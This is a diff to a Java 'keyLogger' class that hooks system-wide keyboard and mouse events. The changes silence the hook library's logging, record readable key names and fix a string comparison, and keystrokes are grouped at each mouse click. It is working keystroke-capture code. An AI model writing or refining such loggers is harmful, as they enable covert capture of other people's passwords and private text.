@@ -49,6 +49,7 @@ public class keyLogger implements NativeKeyListener, NativeMouseListener, Native
 		GlobalScreen.addNativeMouseWheelListener(this);
 		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
 		logger.setLevel(Level.OFF);
+		logger.setUseParentHandlers(false);
 		this.chaine = new ArrayList<String>();
 	}
 
@@ -82,11 +83,10 @@ public class keyLogger implements NativeKeyListener, NativeMouseListener, Native
 
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
-		int keyText = nativeEvent.getKeyCode();
-		this.current +=new String(new char[] { (char) keyText });
+		String keyText = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
+		this.current += keyText;
 		update();
 	}
-
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
 		update();
@@ -100,7 +100,7 @@ public class keyLogger implements NativeKeyListener, NativeMouseListener, Native
 
 	@Override
 	public void nativeMousePressed(NativeMouseEvent nativeEvent) {
-		if(this.current == "") {
+		if(this.current.equals("")) {
 			return;
 		}
 		this.chaine.add(this.current);
